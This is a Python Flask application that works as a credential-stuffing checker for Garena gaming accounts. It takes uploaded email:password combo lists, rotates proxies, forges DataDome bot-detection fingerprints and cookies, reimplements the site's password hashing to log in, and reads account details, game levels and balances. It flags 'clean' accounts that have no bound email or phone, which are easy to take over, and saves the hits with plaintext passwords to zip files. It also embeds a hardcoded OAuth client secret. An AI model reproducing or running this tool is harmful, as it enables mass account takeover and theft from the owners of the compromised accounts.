import os
import threading
import queue
import time
import random
import zipfile
import json
import uuid
import base64
import re
from flask import Flask, render_template, request, jsonify, send_file, Response
from werkzeug.utils import secure_filename
import cloudscraper
import requests
from Crypto.Cipher import AES
import hashlib
import urllib.parse

app = Flask(__name__)
app.config['UPLOAD_FOLDER'] = 'uploads'
app.config['RESULTS_FOLDER'] = 'results'

os.makedirs(app.config['UPLOAD_FOLDER'], exist_ok=True)
os.makedirs(app.config['RESULTS_FOLDER'], exist_ok=True)

# -------------------- Crypto Functions --------------------
def encode(plaintext, key):
    key = bytes.fromhex(key)
    plaintext = bytes.fromhex(plaintext)
    cipher = AES.new(key, AES.MODE_ECB)
    return cipher.encrypt(plaintext).hex()[:32]

def get_passmd5(password):
    return hashlib.md5(urllib.parse.unquote(password).encode('utf-8')).hexdigest()

def hash_password(password, v1, v2):
    passmd5 = get_passmd5(password)
    inner_hash = hashlib.sha256((passmd5 + v1).encode()).hexdigest()
    outer_hash = hashlib.sha256((inner_hash + v2).encode()).hexdigest()
    return encode(passmd5, outer_hash)

# -------------------- DataDome Fetch --------------------
def get_datadome_cookie(session, proxy=None):
    url = 'https://dd.garena.com/js/'
    headers = {
        'accept': '*/*',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://account.garena.com',
        'referer': 'https://account.garena.com/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/129.0.0.0 Safari/537.36'
    }
    payload = {
        "jsData": json.dumps({"ttst":76.7,"ifov":False,"hc":4,"br_oh":824,"br_ow":1536,
            "ua":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/129.0.0.0 Safari/537.36",
            "wbd":False,"dp0":True,"tagpu":5.73,"wdifrm":False,"npmtm":False,"br_h":738,
            "br_w":260,"isf":False,"nddc":1,"rs_h":864,"rs_w":1536,"rs_cd":24,"phe":False,
            "nm":False,"jsf":False,"lg":"en-US","pr":1.25,"ars_h":824,"ars_w":1536,"tz":-480,
            "str_ss":True,"str_ls":True,"str_idb":True,"str_odb":False,"plgod":False,"plg":5,
            "plgne":True,"plgre":True,"plgof":False,"plggt":False,"pltod":False,"hcovdr":False,
            "hcovdr2":False,"plovdr":False,"plovdr2":False,"ftsovdr":False,"ftsovdr2":False,
            "lb":False,"eva":33,"lo":False,"ts_mtp":0,"ts_tec":False,"ts_tsa":False,
            "vnd":"Google Inc.","bid":"NA","mmt":"application/pdf,text/pdf",
            "plu":"PDF Viewer,Chrome PDF Viewer,Chromium PDF Viewer,Microsoft Edge PDF Viewer,WebKit built-in PDF",
            "hdn":False,"awe":False,"geb":False,"dat":False,"med":"defined","aco":"probably",
            "acots":False,"acmp":"probably","acmpts":True,"acw":"probably","acwts":False,
            "acma":"maybe","acmats":False,"acaa":"probably","acaats":True,"ac3":"","ac3ts":False,
            "acf":"probably","acfts":False,"acmp4":"maybe","acmp4ts":False,"acmp3":"probably",
            "acmp3ts":False,"acwm":"maybe","acwmts":False,"ocpt":False,"vco":"","vcots":False,
            "vch":"probably","vchts":True,"vcw":"probably","vcwts":True,"vc3":"maybe","vc3ts":False,
            "vcmp":"","vcmpts":False,"vcq":"maybe","vcqts":False,"vc1":"probably","vc1ts":True,
            "dvm":8,"sqt":False,"so":"landscape-primary","bda":False,"wdw":True,"prm":True,
            "tzp":True,"cvs":True,"usb":True,"cap":True,"tbf":False,"lgs":True,"tpd":True
        }),
        'eventCounters':'[]','jsType':'ch',
        'cid':'KOWn3t9QNk3dJJJEkpZJpspfb2HPZIVs0KSR7RYTscx5iO7o84cw95j40zFFG7mpfbKxmfhAOs~bM8Lr8cHia2JZ3Cq2LAn5k6XAKkONfSSad99Wu36EhKYyODGCZwae',
        'ddk':'AE3F04AD3F0D3A462481A337485081','Referer':'https://account.garena.com/','request':'/',
        'responsePage':'origin','ddv':'4.35.4'
    }
    data = '&'.join(f'{k}={urllib.parse.quote(str(v))}' for k,v in payload.items())
    proxies = {'http': proxy, 'https': proxy} if proxy else None
    try:
        response = requests.post(url, headers=headers, data=data, timeout=15, proxies=proxies)
        response_json = response.json()
        if response_json.get('status') == 200 and 'cookie' in response_json:
            return response_json['cookie'].split(';')[0].split('=')[1]
    except:
        pass
    return None

# -------------------- CODM Access Token --------------------
def get_codm_access_token(session):
    try:
        random_id = str(int(time.time()*1000))
        grant_url = "https://100082.connect.garena.com/oauth/token/grant"
        grant_headers = {
            "Host":"100082.connect.garena.com","Connection":"keep-alive","sec-ch-ua-platform":"\"Android\"",
            "User-Agent":"Mozilla/5.0 (Linux; Android 15; Lenovo TB-9707F Build/AP3A.240905.015.A2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/144.0.7559.59 Mobile Safari/537.36; GarenaMSDK/5.12.1(Lenovo TB-9707F ;Android 15;en;us;)",
            "Accept":"application/json, text/plain, */*","sec-ch-ua":"\"Not(A:Brand\";v=\"8\", \"Chromium\";v=\"144\", \"Android WebView\";v=\"144\"",
            "Content-Type":"application/x-www-form-urlencoded;charset=UTF-8","sec-ch-ua-mobile":"?1","Origin":"https://100082.connect.garena.com",
            "X-Requested-With":"com.garena.game.codm","Sec-Fetch-Site":"same-origin","Sec-Fetch-Mode":"cors","Sec-Fetch-Dest":"empty",
            "Referer":"https://100082.connect.garena.com/universal/oauth?client_id=100082&locale=en-US&create_grant=true&login_scenario=normal&redirect_uri=gop100082://auth/&response_type=code",
            "Accept-Encoding":"gzip, deflate, br, zstd","Accept-Language":"en-US,en;q=0.9"
        }
        device_id = f"02-{str(uuid.uuid4())}"
        grant_data = f"client_id=100082&redirect_uri=gop100082%3A%2F%2Fauth%2F&response_type=code&id={random_id}"
        grant_response = session.post(grant_url, headers=grant_headers, data=grant_data, timeout=15)
        grant_json = grant_response.json()
        auth_code = grant_json.get("code", "")
        if not auth_code:
            return "", "", ""
        token_url = "https://100082.connect.garena.com/oauth/token/exchange"
        token_headers = {
            "User-Agent":"GarenaMSDK/5.12.1(Lenovo TB-9707F ;Android 15;en;us;)",
            "Content-Type":"application/x-www-form-urlencoded","Host":"100082.connect.garena.com",
            "Connection":"Keep-Alive","Accept-Encoding":"gzip"
        }
        token_data = f"grant_type=authorization_code&code={auth_code}&device_id={device_id}&redirect_uri=gop100082%3A%2F%2Fauth%2F&source=2&client_id=100082&client_secret=388066813c7cda8d51c1a70b0f6050b991986326fcfb0cb3bf2287e861cfa415"
        token_response = session.post(token_url, headers=token_headers, data=token_data, timeout=15)
        token_json = token_response.json()
        return token_json.get("access_token",""), token_json.get("open_id",""), token_json.get("uid","")
    except:
        return "", "", ""

def process_codm_callback(session, access_token):
    try:
        old_callback_url = f"https://api-delete-request.codm.garena.co.id/oauth/callback/?access_token={access_token}"
        old_headers = {"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                       "user-agent":"Mozilla/5.0 (Linux; Android 15; Lenovo TB-9707F) AppleWebKit/537.36 Chrome/144.0.0.0 Mobile Safari/537.36",
                       "referer":"https://auth.garena.com/"}
        old_response = session.get(old_callback_url, headers=old_headers, allow_redirects=False, timeout=15)
        location = old_response.headers.get("Location", "")
        if "err=3" in location:
            return None, "no_codm"
        elif "token=" in location:
            token = location.split("token=")[-1].split('&')[0]
            return token, "success"
        aos_callback_url = f"https://api-delete-request-aos.codm.garena.co.id/oauth/callback/?access_token={access_token}"
        aos_headers = {"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                       "user-agent":"Mozilla/5.0 (Linux; Android 15; Lenovo TB-9707F Build/AP3A.240905.015.A2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/144.0.7559.59 Mobile Safari/537.36",
                       "referer":"https://100082.connect.garena.com/","x-requested-with":"com.garena.game.codm"}
        aos_response = session.get(aos_callback_url, headers=aos_headers, allow_redirects=False, timeout=15)
        aos_location = aos_response.headers.get("Location", "")
        if "err=3" in aos_location:
            return None, "no_codm"
        elif "token=" in aos_location:
            token = aos_location.split("token=")[-1].split('&')[0]
            return token, "success"
        return None, "unknown_error"
    except:
        return None, "error"

def get_codm_user_info(session, token):
    try:
        parts = token.split('.')
        if len(parts)==3:
            payload = parts[1]
            padding = 4 - len(payload)%4
            if padding!=4:
                payload += '='*padding
            decoded = base64.urlsafe_b64decode(payload)
            jwt_data = json.loads(decoded)
            user_data = jwt_data.get("user", {})
            if user_data:
                return {
                    "codm_nickname": user_data.get("codm_nickname", user_data.get("nickname","N/A")),
                    "codm_level": user_data.get("codm_level","N/A"),
                    "region": user_data.get("region","N/A"),
                    "uid": user_data.get("uid","N/A"),
                    "open_id": user_data.get("open_id","N/A"),
                    "t_open_id": user_data.get("t_open_id","N/A")
                }
        url = "https://api-delete-request-aos.codm.garena.co.id/oauth/check_login/"
        headers = {"accept":"application/json, text/plain, */*","codm-delete-token":token,
                   "origin":"https://delete-request-aos.codm.garena.co.id","referer":"https://delete-request-aos.codm.garena.co.id/",
                   "user-agent":"Mozilla/5.0 (Linux; Android 15; Lenovo TB-9707F Build/AP3A.240905.015.A2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/144.0.7559.59 Mobile Safari/537.36",
                   "x-requested-with":"com.garena.game.codm"}
        response = session.get(url, headers=headers, timeout=15)
        data = response.json()
        user_data = data.get("user", {})
        if user_data:
            return {
                "codm_nickname": user_data.get("codm_nickname","N/A"),
                "codm_level": user_data.get("codm_level","N/A"),
                "region": user_data.get("region","N/A"),
                "uid": user_data.get("uid","N/A"),
                "open_id": user_data.get("open_id","N/A"),
                "t_open_id": user_data.get("t_open_id","N/A")
            }
        return {}
    except:
        return {}

# -------------------- Game Connections --------------------
def get_game_connections(session):
    game_info = []
    valid_regions = {'sg','ph','my','tw','th','id','in','vn'}
    game_mappings = {
        'tw': {"100082":"CODM","100067":"FREE FIRE","100070":"SPEED DRIFTERS","100130":"BLACK CLOVER M","100105":"GARENA UNDAWN","100050":"ROV","100151":"DELTA FORCE","100147":"FAST THRILL","100107":"MOONLIGHT BLADE"},
        'th': {"100067":"FREEFIRE","100055":"ROV","100082":"CODM","100151":"DELTA FORCE","100105":"GARENA UNDAWN","100130":"BLACK CLOVER M","100070":"SPEED DRIFTERS","32836":"FC ONLINE","100071":"FC ONLINE M","100124":"MOONLIGHT BLADE"},
        'vn': {"32837":"FC ONLINE","100072":"FC ONLINE M","100054":"ROV","100137":"THE WORLD OF WAR"},
        'default': {"100082":"CODM","100067":"FREEFIRE","100151":"DELTA FORCE","100105":"GARENA UNDAWN","100057":"AOV","100070":"SPEED DRIFTERS","100130":"BLACK CLOVER M","100055":"ROV"}
    }
    try:
        token_url = "https://authgop.garena.com/oauth/token/grant"
        token_headers = {"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64)","Pragma":"no-cache","Accept":"*/*","Content-Type":"application/x-www-form-urlencoded"}
        token_data = f"client_id=10017&response_type=token&redirect_uri=https%3A%2F%2Fshop.garena.sg%2F%3Fapp%3D100082&format=json&id={int(time.time()*1000)}"
        token_response = session.post(token_url, headers=token_headers, data=token_data, timeout=30)
        token_json = token_response.json()
        access_token = token_json.get("access_token", "")
        if not access_token:
            return []
        inspect_url = "https://shop.garena.sg/api/auth/inspect_token"
        inspect_headers = {"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64)","Pragma":"no-cache","Accept":"*/*","Content-Type":"application/json"}
        inspect_data = {"token":access_token}
        inspect_response = session.post(inspect_url, headers=inspect_headers, json=inspect_data, timeout=30)
        inspect_json = inspect_response.json()
        session_key_roles = inspect_response.cookies.get('session_key')
        if not session_key_roles:
            return []
        uac = inspect_json.get("uac","ph").lower()
        region = uac if uac in valid_regions else 'ph'
        if region=='th' or region=='in':
            base_domain = "termgame.com"
        elif region=='id':
            base_domain = "kiosgamer.co.id"
        elif region=='vn':
            base_domain = "napthe.vn"
        else:
            base_domain = f"shop.garena.{region}"
        applicable_games = game_mappings.get(region, game_mappings['default'])
        for app_id, game_name in applicable_games.items():
            roles_url = f"https://{base_domain}/api/shop/apps/roles"
            params_roles = {'app_id':app_id}
            headers_roles = {'User-Agent':"Mozilla/5.0 (Windows NT 10.0; Win64; x64)","Accept":"application/json, text/plain, */*",
                             'Referer':f"https://{base_domain}/?app={app_id}",'Cookie':f"session_key={session_key_roles}"}
            try:
                roles_response = session.get(roles_url, params=params_roles, headers=headers_roles, timeout=30)
                roles_data = roles_response.json()
                role = None
                if isinstance(roles_data.get("role"),list) and roles_data["role"]:
                    role = roles_data["role"][0]
                elif app_id in roles_data and isinstance(roles_data[app_id],list) and roles_data[app_id]:
                    candidate = roles_data[app_id][0]
                    if isinstance(candidate,dict):
                        role = candidate.get("role") or candidate.get("user_id")
                    else:
                        role = str(candidate)
                elif isinstance(roles_data,list) and roles_data:
                    first = roles_data[0]
                    if isinstance(first,dict) and first.get("role"):
                        role = first.get("role")
                if role:
                    game_info.append({'region':region.upper(),'game':game_name,'role':str(role)})
            except:
                continue
    except:
        pass
    return game_info

# -------------------- Account Details Parser --------------------
def parse_account_details(data):
    user_info = data.get('user_info', data)
    binds = []
    email = user_info.get('email', 'N/A')
    if email not in ['N/A', '', None] and '@' in email and not re.match(r'^\*+@\*+\.\w+$', email):
        binds.append('Email')
    mobile = user_info.get('mobile_no', 'N/A')
    if mobile and mobile not in ['N/A', '', 'Not Set', 'null']:
        binds.append('Phone')
    fb_data = user_info.get('fb_account')
    if isinstance(fb_data, dict) and fb_data.get('fb_username'):
        binds.append('Facebook')
    elif user_info.get('is_fbconnect_enabled', False):
        binds.append('Facebook')
    is_clean = len(binds) == 0
    return {
        'uid': user_info.get('uid', 'N/A'),
        'username': user_info.get('username', 'N/A'),
        'email': email,
        'mobile': mobile,
        'country': user_info.get('acc_country', 'N/A'),
        'shell': user_info.get('shell', 0),
        'binds': binds,
        'is_clean': is_clean,
        'fb_account': fb_data,
        'email_verified': bool(user_info.get('email_v', 0)),
        'two_fa': bool(user_info.get('two_step_verify_enable', 0)),
        'status': user_info.get('status', 0)
    }

# -------------------- Main Check Function --------------------
def check_account_full(account_line, proxy=None, cookie=None, result_folder='results', check_games=True):
    if ':' not in account_line:
        return None
    email, password = account_line.split(':', 1)
    email = email.strip()
    password = password.strip()

    session = cloudscraper.create_scraper()
    if proxy:
        session.proxies = {'http': proxy, 'https': proxy}

    # Use cookie or fetch
    if cookie:
        session.cookies.set('datadome', cookie, domain='.garena.com')
    else:
        dd = get_datadome_cookie(session, proxy)
        if dd:
            session.cookies.set('datadome', dd, domain='.garena.com')

    # Prelogin
    url = 'https://sso.garena.com/api/prelogin'
    params = {'app_id':'10100','account':email,'format':'json','id':str(int(time.time()*1000))}
    try:
        resp = session.get(url, params=params, timeout=30)
        if resp.status_code != 200:
            return {'email': email, 'valid': False, 'error': f'Prelogin {resp.status_code}'}
        data = resp.json()
        if 'error' in data:
            return {'email': email, 'valid': False, 'error': data['error']}
        v1, v2 = data.get('v1'), data.get('v2')
        if not v1 or not v2:
            return {'email': email, 'valid': False, 'error': 'Missing v1/v2'}
    except Exception as e:
        return {'email': email, 'valid': False, 'error': str(e)}

    # Login
    hashed = hash_password(password, v1, v2)
    params = {'app_id':'10100','account':email,'password':hashed,
              'redirect_uri':'https://account.garena.com/','format':'json','id':str(int(time.time()*1000))}
    try:
        resp = session.get('https://sso.garena.com/api/login', params=params, timeout=30)
        if resp.status_code != 200:
            return {'email': email, 'valid': False, 'error': f'Login {resp.status_code}'}
        data = resp.json()
        if 'error' in data:
            return {'email': email, 'valid': False, 'error': data['error']}
    except Exception as e:
        return {'email': email, 'valid': False, 'error': str(e)}

    # Get account info
    try:
        resp = session.get('https://account.garena.com/api/account/init', timeout=30)
        acc_data = resp.json()
    except:
        return {'email': email, 'valid': False, 'error': 'Account info failed'}

    details = parse_account_details(acc_data)
    details['password'] = password
    is_clean = details['is_clean']
    country = details['country']
    shell = details['shell']

    # CODM check
    codm_info = {}
    has_codm = False
    try:
        access_token, open_id, uid = get_codm_access_token(session)
        if access_token:
            codm_token, status = process_codm_callback(session, access_token)
            if status == 'success' and codm_token:
                codm_info = get_codm_user_info(session, codm_token)
                if codm_info and codm_info.get('codm_level', 'N/A') != 'N/A':
                    has_codm = True
    except:
        pass

    # Game connections
    game_connections = []
    if check_games:
        try:
            game_connections = get_game_connections(session)
        except:
            pass

    # If CODM found but not in game_connections, add it
    if has_codm and codm_info:
        codm_game = {'region': codm_info.get('region','N/A').upper(), 'game': 'CODM', 'role': codm_info.get('codm_nickname','N/A')}
        if 'CODM' not in [g.get('game','') for g in game_connections]:
            game_connections.insert(0, codm_game)

    # Save results
    os.makedirs(result_folder, exist_ok=True)

    # Base entry for saving
    base_entry = f"{email}:{password} | Shell: {shell} | Country: {country} | Binds: {', '.join(details['binds']) or 'None'}"
    if has_codm:
        base_entry += f" | CODM Lv.{codm_info.get('codm_level','N/A')} | IGN: {codm_info.get('codm_nickname','N/A')}"

    # Clean/Not Clean
    clean_file = os.path.join(result_folder, 'Clean.txt' if is_clean else 'Not_Clean.txt')
    with open(clean_file, 'a', encoding='utf-8') as f:
        f.write(base_entry + '\n')

    # Shell
    if shell > 0:
        with open(os.path.join(result_folder, 'Shell.txt'), 'a', encoding='utf-8') as f:
            f.write(base_entry + '\n')

    # CODM by level
    if has_codm:
        level = codm_info.get('codm_level', 'N/A')
        if level != 'N/A':
            level_folder = os.path.join(result_folder, 'CODM_by_level')
            os.makedirs(level_folder, exist_ok=True)
            with open(os.path.join(level_folder, f'level_{level}.txt'), 'a', encoding='utf-8') as f:
                f.write(base_entry + '\n')
            region = codm_info.get('region', 'N/A')
            region_folder = os.path.join(result_folder, 'CODM_by_region')
            os.makedirs(region_folder, exist_ok=True)
            with open(os.path.join(region_folder, f'{region}.txt'), 'a', encoding='utf-8') as f:
                f.write(base_entry + '\n')

    # Game connections folder
    if game_connections:
        games_folder = os.path.join(result_folder, 'Games')
        os.makedirs(games_folder, exist_ok=True)
        saved = set()
        for g in game_connections:
            gname = g.get('game', '').upper()
            if gname in saved:
                continue
            saved.add(gname)
            fname = gname.replace(' ', '_') + '.txt'
            with open(os.path.join(games_folder, fname), 'a', encoding='utf-8') as f:
                f.write(base_entry + f" | IGN: {g.get('role','N/A')} | Region: {g.get('region','N/A')}\n")

    return {
        'email': email,
        'valid': True,
        'clean': is_clean,
        'shell': shell,
        'country': country,
        'binds': details['binds'],
        'has_codm': has_codm,
        'codm_level': codm_info.get('codm_level', 'N/A') if has_codm else None,
        'codm_ign': codm_info.get('codm_nickname', 'N/A') if has_codm else None,
        'games': len(game_connections)
    }

# -------------------- Flask Routes --------------------
tasks = {}

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/start', methods=['POST'])
def start_check():
    task_id = str(uuid.uuid4())
    file = request.files.get('combo')
    if not file:
        return jsonify({'error': 'No combo file'}), 400

    filename = secure_filename(file.filename)
    upload_path = os.path.join(app.config['UPLOAD_FOLDER'], f'{task_id}_{filename}')
    file.save(upload_path)

    with open(upload_path, 'r', encoding='utf-8', errors='ignore') as f:
        accounts = [line.strip() for line in f if line.strip() and ':' in line]

    threads = int(request.form.get('threads', 1))
    use_proxy = request.form.get('use_proxy', 'false').lower() == 'true'
    check_games = request.form.get('check_games', 'true').lower() == 'true'

    proxies = []
    if use_proxy:
        proxy_file = request.files.get('proxies')
        if proxy_file:
            content = proxy_file.read().decode('utf-8')
            proxies = [line.strip() for line in content.splitlines() if line.strip()]

    cookies = []
    cookie_file = request.files.get('cookies')
    if cookie_file:
        content = cookie_file.read().decode('utf-8')
        for line in content.splitlines():
            line = line.strip()
            if not line:
                continue
            if ';' in line:
                for part in line.split(';'):
                    part = part.strip()
                    if part.startswith('datadome='):
                        val = part.split('=', 1)[1].strip()
                        if val:
                            cookies.append(val)
                            break
            elif line.startswith('datadome='):
                val = line.split('=', 1)[1].strip()
                if val:
                    cookies.append(val)
            else:
                cookies.append(line)

    result_folder = os.path.join(app.config['RESULTS_FOLDER'], task_id)
    os.makedirs(result_folder, exist_ok=True)

    progress_queue = queue.Queue()
    tasks[task_id] = {
        'queue': progress_queue,
        'total': len(accounts),
        'checked': 0,
        'valid': 0,
        'clean': 0,
        'codm': 0,
        'status': 'running',
        'result_folder': result_folder
    }

    def worker():
        checked = 0
        valid = 0
        clean = 0
        codm_count = 0
        cookie_idx = 0

        for i, acc in enumerate(accounts):
            proxy = random.choice(proxies) if (use_proxy and proxies) else None
            cookie = cookies[cookie_idx % len(cookies)] if cookies else None
            if cookies:
                cookie_idx += 1

            result = check_account_full(acc, proxy, cookie, result_folder, check_games)
            checked += 1
            if result and result.get('valid'):
                valid += 1
                if result.get('clean'):
                    clean += 1
                if result.get('has_codm'):
                    codm_count += 1

            tasks[task_id]['checked'] = checked
            tasks[task_id]['valid'] = valid
            tasks[task_id]['clean'] = clean
            tasks[task_id]['codm'] = codm_count
            progress_queue.put({
                'checked': checked,
                'total': len(accounts),
                'valid': valid,
                'clean': clean,
                'codm': codm_count,
                'current': acc.split(':')[0],
                'level': result.get('codm_level') if result else None
            })
            time.sleep(0.1)

        # Create ZIP
        zip_path = os.path.join(app.config['RESULTS_FOLDER'], f'{task_id}.zip')
        with zipfile.ZipFile(zip_path, 'w') as zipf:
            for root, _, files in os.walk(result_folder):
                for file in files:
                    full = os.path.join(root, file)
                    arc = os.path.relpath(full, result_folder)
                    zipf.write(full, arc)

        tasks[task_id]['status'] = 'completed'
        tasks[task_id]['zip'] = f'/download/{task_id}'
        progress_queue.put({'done': True, 'zip': f'/download/{task_id}'})

    threading.Thread(target=worker).start()
    return jsonify({'task_id': task_id})

@app.route('/progress/<task_id>')
def progress(task_id):
    def generate():
        if task_id not in tasks:
            yield 'data: {"error": "Invalid task"}\n\n'
            return
        q = tasks[task_id]['queue']
        while True:
            try:
                msg = q.get(timeout=30)
                yield f'data: {json.dumps(msg)}\n\n'
                if msg.get('done'):
                    break
            except queue.Empty:
                yield 'data: {"heartbeat": true}\n\n'
    return Response(generate(), mimetype='text/event-stream')

@app.route('/download/<task_id>')
def download(task_id):
    zip_path = os.path.join(app.config['RESULTS_FOLDER'], f'{task_id}.zip')
    if os.path.exists(zip_path):
        return send_file(zip_path, as_attachment=True, download_name='results.zip')
    return 'File not found', 404

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
